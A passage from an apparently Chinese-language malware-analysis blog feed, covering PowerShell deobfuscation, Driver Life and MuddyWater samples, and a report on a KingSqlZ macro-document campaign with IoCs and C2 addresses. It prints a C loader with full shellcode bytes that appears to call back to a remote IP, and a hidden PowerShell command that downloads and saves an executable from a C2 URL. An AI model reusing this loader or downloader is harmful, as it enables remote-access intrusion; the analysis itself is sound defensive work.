src="http://hacky.wang/blog/20190626/0rstQItBCLi5.png?imageslim" alt="mark"></li><li>4.解base64编码，得到FromPowershell.ps1_,可以观察到是利用利用virtuallAlloc执行shellcode</li><li>如果发现ps1脚本里面有shellcode，只需要用C语言内联shellcode字节，然后调试即可。如下是shellcode利用脚本<figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span>(<span class="params"><span class="keyword">void</span></span>)</span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">printf(<span class="string">"hhhhh\n"</span>);</div><div class="line"><span class="keyword">char</span> shellcode[] = &#123;<span class="string">'\xfc'</span>,<span class="string">'\xe8'</span>,<span class="string">'\x82'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x60'</span>,<span class="string">'\x89'</span>,<span class="string">'\xe5'</span>,<span class="string">'\x31'</span>,<span class="string">'\xc0'</span>,<span class="string">'\x64'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x50'</span>,<span class="string">'\x30'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x52'</span>,<span class="string">'\x0c'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x52'</span>,<span class="string">'\x14'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x72'</span>,<span class="string">'\x28'</span>,<span class="string">'\x0f'</span>,<span class="string">'\xb7'</span>,<span class="string">'\x4a'</span>,<span class="string">'\x26'</span>,<span class="string">'\x31'</span>,<span class="string">'\xff'</span>,<span class="string">'\xac'</span>,<span class="string">'\x3c'</span>,<span class="string">'\x61'</span>,<span class="string">'\x7c'</span>,<span class="string">'\x02'</span>,<span class="string">'\x2c'</span>,<span class="string">'\x20'</span>,<span class="string">'\xc1'</span>,<span class="string">'\xcf'</span>,<span class="string">'\x0d'</span>,<span class="string">'\x01'</span>,<span class="string">'\xc7'</span>,<span class="string">'\xe2'</span>,<span class="string">'\xf2'</span>,<span class="string">'\x52'</span>,<span class="string">'\x57'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x52'</span>,<span class="string">'\x10'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x4a'</span>,<span class="string">'\x3c'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x4c'</span>,<span class="string">'\x11'</span>,<span class="string">'\x78'</span>,<span class="string">'\xe3'</span>,<span class="string">'\x48'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd1'</span>,<span class="string">'\x51'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x59'</span>,<span class="string">'\x20'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd3'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x49'</span>,<span class="string">'\x18'</span>,<span class="string">'\xe3'</span>,<span class="string">'\x3a'</span>,<span class="string">'\x49'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x34'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd6'</span>,<span class="string">'\x31'</span>,<span class="string">'\xff'</span>,<span class="string">'\xac'</span>,<span class="string">'\xc1'</span>,<span class="string">'\xcf'</span>,<span class="string">'\x0d'</span>,<span class="string">'\x01'</span>,<span class="string">'\xc7'</span>,<span class="string">'\x38'</span>,<span class="string">'\xe0'</span>,<span class="string">'\x75'</span>,<span class="string">'\xf6'</span>,<span class="string">'\x03'</span>,<span class="string">'\x7d'</span>,<span class="string">'\xf8'</span>,<span class="string">'\x3b'</span>,<span class="string">'\x7d'</span>,<span class="string">'\x24'</span>,<span class="string">'\x75'</span>,<span class="string">'\xe4'</span>,<span class="string">'\x58'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x58'</span>,<span class="string">'\x24'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd3'</span>,<span class="string">'\x66'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x0c'</span>,<span class="string">'\x4b'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x58'</span>,<span class="string">'\x1c'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd3'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x04'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd0'</span>,<span class="string">'\x89'</span>,<span class="string">'\x44'</span>,<span class="string">'\x24'</span>,<span class="string">'\x24'</span>,<span class="string">'\x5b'</span>,<span class="string">'\x5b'</span>,<span class="string">'\x61'</span>,<span class="string">'\x59'</span>,<span class="string">'\x5a'</span>,<span class="string">'\x51'</span>,<span class="string">'\xff'</span>,<span class="string">'\xe0'</span>,<span class="string">'\x5f'</span>,<span class="string">'\x5f'</span>,<span class="string">'\x5a'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x12'</span>,<span class="string">'\xeb'</span>,<span class="string">'\x8d'</span>,<span class="string">'\x5d'</span>,<span class="string">'\x68'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x65'</span>,<span class="string">'\x74'</span>,<span class="string">'\x00'</span>,<span class="string">'\x68'</span>,<span class="string">'\x77'</span>,<span class="string">'\x69'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x69'</span>,<span class="string">'\x54'</span>,<span class="string">'\x68'</span>,<span class="string">'\x4c'</span>,<span class="string">'\x77'</span>,<span class="string">'\x26'</span>,<span class="string">'\x07'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x31'</span>,<span class="string">'\xdb'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x68'</span>,<span class="string">'\x3a'</span>,<span class="string">'\x56'</span>,<span class="string">'\x79'</span>,<span class="string">'\xa7'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x03'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x68'</span>,<span class="string">'\xbb'</span>,<span class="string">'\x01'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\xe8'</span>,<span class="string">'\xa7'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x2f'</span>,<span class="string">'\x4c'</span>,<span class="string">'\x37'</span>,<span class="string">'\x6c'</span>,<span class="string">'\x37'</span>,<span class="string">'\x46'</span>,<span class="string">'\x38'</span>,<span class="string">'\x51'</span>,<span class="string">'\x73'</span>,<span class="string">'\x64'</span>,<span class="string">'\x71'</span>,<span class="string">'\x4f'</span>,<span class="string">'\x68'</span>,<span class="string">'\x6b'</span>,<span class="string">'\x36'</span>,<span class="string">'\x43'</span>,<span class="string">'\x53'</span>,<span class="string">'\x39'</span>,<span class="string">'\x32'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x6b'</span>,<span class="string">'\x35'</span>,<span class="string">'\x41'</span>,<span class="string">'\x4a'</span>,<span class="string">'\x58'</span>,<span class="string">'\x57'</span>,<span class="string">'\x54'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x70'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x75'</span>,<span class="string">'\x4d'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x66'</span>,<span class="string">'\x48'</span>,<span class="string">'\x00'</span>,<span class="string">'\x50'</span>,<span class="string">'\x68'</span>,<span class="string">'\x57'</span>,<span class="string">'\x89'</span>,<span class="string">'\x9f'</span>,<span class="string">'\xc6'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x89'</span>,<span class="string">'\xc6'</span>,<span class="string">'\x53'</span>,<span class="string">'\x68'</span>,<span class="string">'\x00'</span>,<span class="string">'\x32'</span>,<span class="string">'\xe0'</span>,<span class="string">'\x84'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x57'</span>,<span class="string">'\x53'</span>,<span class="string">'\x56'</span>,<span class="string">'\x68'</span>,<span class="string">'\xeb'</span>,<span class="string">'\x55'</span>,<span class="string">'\x2e'</span>,<span class="string">'\x3b'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x96'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x0a'</span>,<span class="string">'\x5f'</span>,<span class="string">'\x68'</span>,<span class="string">'\x80'</span>,<span class="string">'\x33'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x89'</span>,<span class="string">'\xe0'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x04'</span>,<span class="string">'\x50'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x1f'</span>,<span class="string">'\x56'</span>,<span class="string">'\x68'</span>,<span class="string">'\x75'</span>,<span class="string">'\x46'</span>,<span class="string">'\x9e'</span>,<span class="string">'\x86'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x56'</span>,<span class="string">'\x68'</span>,<span class="string">'\x2d'</span>,<span class="string">'\x06'</span>,<span class="string">'\x18'</span>,<span class="string">'\x7b'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x85'</span>,<span class="string">'\xc0'</span>,<span class="string">'\x75'</span>,<span class="string">'\x08'</span>,<span class="string">'\x4f'</span>,<span class="string">'\x75'</span>,<span class="string">'\xd9'</span>,<span class="string">'\xe8'</span>,<span class="string">'\x4b'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x40'</span>,<span class="string">'\x68'</span>,<span class="string">'\x00'</span>,<span class="string">'\x10'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x68'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x40'</span>,<span class="string">'\x00'</span>,<span class="string">'\x53'</span>,<span class="string">'\x68'</span>,<span class="string">'\x58'</span>,<span class="string">'\xa4'</span>,<span class="string">'\x53'</span>,<span class="string">'\xe5'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x93'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x89'</span>,<span class="string">'\xe7'</span>,<span class="string">'\x57'</span>,<span class="string">'\x68'</span>,<span class="string">'\x00'</span>,<span class="string">'\x20'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x53'</span>,<span class="string">'\x56'</span>,<span class="string">'\x68'</span>,<span class="string">'\x12'</span>,<span class="string">'\x96'</span>,<span class="string">'\x89'</span>,<span class="string">'\xe2'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x85'</span>,<span class="string">'\xc0'</span>,<span class="string">'\x74'</span>,<span class="string">'\xcf'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x07'</span>,<span class="string">'\x01'</span>,<span class="string">'\xc3'</span>,<span class="string">'\x85'</span>,<span class="string">'\xc0'</span>,<span class="string">'\x75'</span>,<span class="string">'\xe5'</span>,<span class="string">'\x58'</span>,<span class="string">'\xc3'</span>,<span class="string">'\x5f'</span>,<span class="string">'\xe8'</span>,<span class="string">'\x77'</span>,<span class="string">'\xff'</span>,<span class="string">'\xff'</span>,<span class="string">'\xff'</span>,<span class="string">'\x31'</span>,<span class="string">'\x33'</span>,<span class="string">'\x38'</span>,<span class="string">'\x2e'</span>,<span class="string">'\x31'</span>,<span class="string">'\x32'</span>,<span class="string">'\x38'</span>,<span class="string">'\x2e'</span>,<span class="string">'\x31'</span>,<span class="string">'\x39'</span>,<span class="string">'\x36'</span>,<span class="string">'\x2e'</span>,<span class="string">'\x38'</span>,<span class="string">'\x34'</span>,<span class="string">'\x00'</span>,<span class="string">'\xbb'</span>,<span class="string">'\xf0'</span>,<span class="string">'\xb5'</span>,<span class="string">'\xa2'</span>,<span class="string">'\x56'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x00'</span>,<span class="string">'\x53'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>&#125;;</div><div class="line">DWORD oldProtect = <span class="number">0</span>;</div><div class="line">VirtualProtect(shellcode, <span class="keyword">sizeof</span>(shellcode), PAGE_EXECUTE_READWRITE,&amp;oldProtect);</div><div class="line">((<span class="keyword">void</span>(*)(<span class="keyword">void</span>))&amp;shellcode)();</div><div class="line">VirtualProtect(shellcode, <span class="keyword">sizeof</span>(shellcode), oldProtect, &amp;oldProtect);</div><div class="line">getchar();</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><h1 id="0x4-驱动人生样本"><a href="#0x4-驱动人生样本" class="headerlink" title="0x4 驱动人生样本"></a>0x4 驱动人生样本</h1><ul><li>1.得到样本g123.ps1，<code>Invoke-Expression</code>是一个可以将变量(字符串)当成可以执行的语句。正常情况下如果有此语句是不能显示代码语句的，但是我们可以使用<code>Write-Host</code>打印代码。在powershell中执行g123.ps1。可以发现代码被严重混淆。将其重定向输出成1.ps1即可<br>  <img src="http://hacky.wang/blog/20190629/E7015YVIThF9.png?imageslim" alt="mark"></li><li>2.但是仍然发现代码被混淆严重，但是可以发现代码的一些蛛丝马迹。看代码最后一行。它其中是以. (表达式)(表达式)来执行的。可以联想到Invoke-Expression。看到在&amp; ((GV ‘<em>mDr</em>‘).nAME[3,11,2]-joiN’’)之前有个管道符。使用<code>Out-File .\tmp.log</code>重定向即可。得到2.ps1<br>  <img src="http://hacky.wang/blog/20190629/3aIiKnEUJr3L.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190629/7Vgnc0a8TVuQ.png?imageslim" alt="mark"></li><li>2.ps1和1.ps1是一样的。使用<code>Out-File .\tmp.log</code>解决，得到3.ps1.</li><li>3.3.ps1换了一种混淆方式，但是处理是一样的。 <code>($sHELLiD[1]+$ShelLiD[13]+&#39;X&#39;)</code>可以猜测是IEX。解混淆得到4.ps1.<br>  <img src="http://hacky.wang/blog/20190629/uGmvm4Po1BuL.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190629/FHPzGfssxIKj.png?imageslim" alt="mark"><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2></li><li>遇到混淆了的powershell，除了常规的字符替换之类的方法，还有三种方法可以解混淆。<ul><li>1.遇上Base64加密的，可以将<code>Invoke-Expression</code>修改为<code>Write-Host</code>即可。</li><li>2.出现在结尾的IEX字段，这时候，可以利用输出重定向，使用<code>Out-File .\tmp.log</code>.<strong>重点是查看是否有管道符</strong></li><li>3.出现在起始部分IEX字段，例如<code>. ( $EnV:CoMsPec[4,26,25]-JoIN&#39;&#39;)(((&#39;[string]3CHav = U&#39;+&#39;ABUAB[string]....</code>。只需要修改语句为<code>Write-Host</code>即可。</li></ul></li><li>备注：解混淆需要活学活用。重点是寻找<code>Invoke-Expression</code>字段</li><li>参考：<a href="https://paper.seebug.org/826/" target="_blank" rel="external">https://paper.seebug.org/826/</a></li></ul><h1 id="0x5-MuddyWater样本"><a href="#0x5-MuddyWater样本" class="headerlink" title="0x5 MuddyWater样本"></a>0x5 MuddyWater样本</h1><ul><li>得到的样本属于宏病毒，通过对vb代码的分析，发现样本会向%tmp释放aulngr.vbe。并设置开机自启。<br>  <img src="http://hacky.wang/blog/20190823/VeyL8BeISw6L.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190823/wSkhC9d67Mov.png?imageslim" alt="mark"></li><li><p>将得到的vbe文件有Decode VBE解密。<a href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/decode-vbe.py" target="_blank" rel="external">https://github.com/DidierStevens/DidierStevensSuite/blob/master/decode-vbe.py</a><br>  <img src="http://hacky.wang/blog/20190823/vJFQ2KIScfM7.png?imageslim" alt="mark"></p></li><li><p>可以看出进行了Base64解密，然后将其写入UserImage.png文件，然后调用Powershell执行<br>  <img src="http://hacky.wang/blog/20190823/fL2aSJsYt7ji.png?imageslim" alt="mark"></p></li><li>将经过Base64加密的数据进行解密，得到一个解密的ps1脚本。<br>  <img src="http://hacky.wang/blog/20190823/t1apT8b88QMv.png?imageslim" alt="mark"></li><li>进过分析，发现主要执行了一下操作：<ul><li>1.获取系统基本信息：进程，系统名称，用户名称，GUID，并存储值log.txt和fl.txt并发送给C2:185.185.25.175<br><img src="http://hacky.wang/blog/20190823/A54OqRKnUsb5.png?imageslim" alt="mark"><br><img src="http://hacky.wang/blog/20190823/TQwrMYnI3PTA.png?imageslim" alt="mark"><br><img src="http://hacky.wang/blog/20190823/DiUEHuv5jyi3.png?imageslim" alt="mark"></li><li>2.<a href="http://185.185.25.175/sDownloads/下载ieee.dat到C:\Users\Public\GUID.JPRG，然后利用Powershell执行" target="_blank" rel="external">http://185.185.25.175/sDownloads/下载ieee.dat到C:\Users\Public\GUID.JPRG，然后利用Powershell执行</a><br><img src="http://hacky.wang/blog/20190823/f2lDuttR3tLb.png?imageslim" alt="mark"><br><img src="http://hacky.wang/blog/20190823/s9EkB4Ft4FKO.png?imageslim" alt="mark"></li></ul></li><li>经过对ieee.dat的分析，发现其是一个后门，不做具体分析</li><li>攻击链如下：<br>  <img src="http://hacky.wang/blog/20190823/6RKHcQLhjEIj.png?imageslim" alt="mark"></li><li>Ioc：36ccae4dffc70249c79cd3156de1cd238af8f7a3e47dc90a1c33476cf97a77b0</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x1-常见混淆&quot;&gt;&lt;a href=&quot;#0x1-常见混淆&quot; class=&quot;headerlink&quot; title=&quot;0x1 常见混淆&quot;&gt;&lt;/a&gt;0x1 常见混淆&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;基于大小写 ：hacky—&amp;gt;HaCky&lt;/li&gt;
&lt;li&gt;基于字符分割：’Ha’+’Cky’—&amp;gt;HaCky&lt;/li&gt;
&lt;li&gt;插入变量：’{0}{1}’-f ‘Ha’,’Kay’—&amp;gt;HaCky&lt;/li&gt;
&lt;li&gt;反引号：H`aCky—&amp;gt;HaCky&lt;/li&gt;
&lt;li&gt;基于命令转换(字符串转化为命令)&amp;amp;(HaCky)—&amp;gt;HaCky&lt;/li&gt;
&lt;li&gt;基于空格或者ASCII
    
    </summary>
    
      <category term="windows系统" scheme="https://findream.github.io/categories/windows%E7%B3%BB%E7%BB%9F/"/>
    
    
  </entry>
  
  <entry>
    <title>针对KingSqlZ组织一次攻击的分析报告</title>
    <link href="https://findream.github.io/2019/05/30/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF_21_%E9%92%88%E5%AF%B9KingSqlZ%E7%BB%84%E7%BB%87%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
    <id>https://findream.github.io/2019/05/30/病毒分析技术_21_针对KingSqlZ组织一次攻击的分析报告/</id>
    <published>2019-05-30T07:02:11.000Z</published>
    <updated>2021-11-02T13:55:21.845Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;近期，启明星辰ADLab监测到一批疑似针对西班牙语地区的政府机构及能源企业等部门的定向攻击活动。通过对攻击者的行为和所用服务器相关信息的分析和追踪，确定该次攻击来源于一批隐秘多年的土耳其黑客组织-KingSqlZ组织。该组织是一个民族主义色彩非常浓厚的黑客组织，曾攻下其他国家的3千多个网站服务器，并高调的在被攻击网站上留下其组织的名称，随后消失了多年。 如今通过研究人员的追踪再次挖出该黑客组织的活动迹象。此次攻击活动通过构造恶意Office Word文档并配合鱼叉邮件发起定向攻击，以“简历更新”作为诱饵文档向攻击目标植入间谍木马，从事情报收集、远控监视及系统破坏等恶意行动。在本次攻击过程中，该组织采用渗透手段攻下多台服务器并将其作为存放攻击代码的跳板。[转]<br><a id="more"></a></p><h1 id="0x1-目录"><a href="#0x1-目录" class="headerlink" title="0x1 目录"></a>0x1 目录</h1><ul><li>1.目录</li><li>2.IoC</li><li>3.行为分析</li><li>4.样本分析</li><li>5.yara规则</li><li>6.后记</li></ul><h1 id="0x2-IoC"><a href="#0x2-IoC" class="headerlink" title="0x2 IoC"></a>0x2 IoC</h1><h2 id="0x2-1-Hash"><a href="#0x2-1-Hash" class="headerlink" title="0x2.1 Hash"></a>0x2.1 Hash</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本次一共截获了两个和<code>KingSqlZ</code>组织有关的可疑样本，其中有一个是一个doc样本，通过使用宏进行文件传播，IOC如下：</p><ul><li>样本名称：4fb43047463380ae25cb7684433f6a7e4f4b8b1669048291aca20182877a2810.doc</li><li>样本Hash：4fb43047463380ae25cb7684433f6a7e4f4b8b1669048291aca20182877a2810</li><li>样本类型：ole文件(带宏)</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;另外一个是一个PE文件。IOC如下：</p><ul><li>样本名称：298ee13829733e23557b5f0db3d93768c0665260be17dc9010288d33ca6fe77f.exe</li><li>样本Hash：298ee13829733e23557b5f0db3d93768c0665260be17dc9010288d33ca6fe77f</li><li>是否加壳：无壳</li><li>编译语言：maybe C++ Visual Studio 201x or Asm demo/example  [DebuG]</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以及这两个样本释放的其他样本的IOC(不包括内存转储): </p><ul><li>2d69c9a9622b9b812db1833caec237995eedd0dee59ece53bd359e7083023f47</li><li>9211473ae545a0248b4ef4bb1bea1acffc1ec85ecb42194984266416720a7f73</li><li>c242bfb6aa6d47087d77d25955bd48a5421fb0353049828ec99d44e119874b7a</li><li>7a01dd19b5a74e7023d19a19065f49fb013c9f0f7fee974d717d46a8369b8e60</li></ul><h2 id="0x2-2-C2"><a href="#0x2-2-C2" class="headerlink" title="0x2.2 C2"></a>0x2.2 C2</h2><ul><li><a href="http://www.gestomarket.co/ylqrg54.exe" target="_blank" rel="external">http://www.gestomarket.co/ylqrg54.exe</a></li><li>asdfwrkhl.warzonedns.com</li><li>linksysdatakeys.se</li><li>67.228.235.93</li><li>187.136.91.177</li><li>187.155.84.184</li><li>31.13.73.17</li><li>67.228.235.93</li><li>31.13.73.23</li><li>74.86.228.110</li><li>187.155.84.184</li><li>69.171.239.11</li><li>187.155.47.67</li><li>66.220.147.47</li><li>31.13.86.1</li><li>31.13.75.17:2404</li><li>备注：这些主机本身不具备相关性，因为他们都是由于被该组织渗透成为该组织攻击的跳板</li></ul><h1 id="0x3-行为分析"><a href="#0x3-行为分析" class="headerlink" title="0x3 行为分析"></a>0x3 行为分析</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;名称统一使用Hash的前几个字符加后缀的方式命名。主要操作是远控类木马。<br>    <img src="http://hacky.wang/blog/20190530/zfiD0zF422xh.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/NMcvDW1urtq1.png?imageslim" alt="mark"></p><h1 id="0x4-样本分析"><a href="#0x4-样本分析" class="headerlink" title="0x4 样本分析"></a>0x4 样本分析</h1><h2 id="0x4-1-4fb430-doc"><a href="#0x4-1-4fb430-doc" class="headerlink" title="0x4.1 4fb430.doc"></a>0x4.1 4fb430.doc</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;是一个doc宏病毒样本，通过使用oledump获取其中的宏代码。<br>    <img src="http://hacky.wang/blog/20190530/l2Ice0RMALU1.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;发现宏代码被混淆严重，去混淆结合沙箱的结果推测具体行为如下：</p><ul><li>宏代码调用cmd，解密其中的十进制数据。</li><li><p>接着调用powershell。下载massive.exe</p><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">powershell</span><span class="selector-class">.exe</span> <span class="selector-tag">-w</span> <span class="selector-tag">hidden</span> <span class="selector-tag">-ep</span> <span class="selector-tag">bypass</span> (New-Object System.Net.WebClient)<span class="selector-class">.DownloadFile</span>(<span class="string">'http://www.gestomarket.co/ylqrg54.exe'</span>,$<span class="attribute">env</span>:temp + <span class="string">'\massive.exe'</span>);</div></pre></td></tr></table></figure></li><li><p>运行massive.exe</p></li></ul><h2 id="0x4-2-massive-exe"><a href="#0x4-2-massive-exe" class="headerlink" title="0x4.2 massive.exe"></a>0x4.2 massive.exe</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先这个样本是一个C#程序，使用ILSpy查看源代码。<br>    <img src="http://hacky.wang/blog/20190530/rkhvbmpQjVhj.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将程序定位到关键的地方。发现这个样本也只是一个外壳程序，用于从攻击跳板上获取攻击代码，然后将其写入我们的内存中，从内存中执行攻击代码，实现了无文件落地，有效规避了查杀。<br>    <img src="http://hacky.wang/blog/20190530/u09pkDcBrOJm.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/wR9hnpBJDbgA.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用进程替换技术，先创建一个和自身相同的子进程，然后使用进程替换进程，执行我们的攻击代码。但是由于C#不好被调试，所以将其子进程转储得到我们落地的攻击样本如下，命名为DumpFrommassive.exe<br>    <img src="http://hacky.wang/blog/20190530/mp7iQpXKuVJS.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/2gGU9cAKIwzX.png?imageslim" alt="mark"></p><h2 id="0x4-3-DumpFrommassive-exe"><a href="#0x4-3-DumpFrommassive-exe" class="headerlink" title="0x4.3 DumpFrommassive.exe"></a>0x4.3 DumpFrommassive.exe</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建一个互斥体，然后获取多个API函数地址<br>    <img src="http://hacky.wang/blog/20190530/bUiMGz4QEXFt.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着判断是否是X64系统，然后通过注册表<code>SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName</code>获取系统的版本信息。<br>    <img src="http://hacky.wang/blog/20190530/3oiXdAdSpEXy.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当判断是xp系统，就去获取HKEY_CURRENT_USER\origmsc数据，但是分析机器上未发现这样的键。<br>    <img src="http://hacky.wang/blog/20190530/lKj49BU7dEGh.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用注册表HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System 关闭UAC通知<br>    <img src="http://hacky.wang/blog/20190530/ALsYol1VFhuN.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过当前的环境变量获取特殊目录的路径<br>    <img src="http://hacky.wang/blog/20190530/lybJLCwmYw1P.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取目标进程的相关信息包括模块和32/64位进程，这个进程是由于注册表中的数据决定。<br>    <img src="http://hacky.wang/blog/20190530/wUI0RvgdTI3u.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于转储很多静态数据丢失，过于细节的数据没有办法复现。<br>    <img src="http://hacky.wang/blog/20190530/4BYRLn86fTlC.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/LqlaGfeqXxjp.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/Ue0MCgcw2SuL.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于该组织使用渗透的方式，得到多台服务器的控制权，让这些服务器充当此次攻击的跳板机和C2<br>    <img src="http://hacky.wang/blog/20190530/Ke9KPR9QMmPE.png?imageslim" alt="mark"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过设置键盘钩子的形式，记录键盘输入，和剪切板数据<br>    <img src="http://hacky.wang/blog/20190530/qD0A3MylalqU.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/DxqaAw6ecywb.png?imageslim" alt="mark"><br>    <img 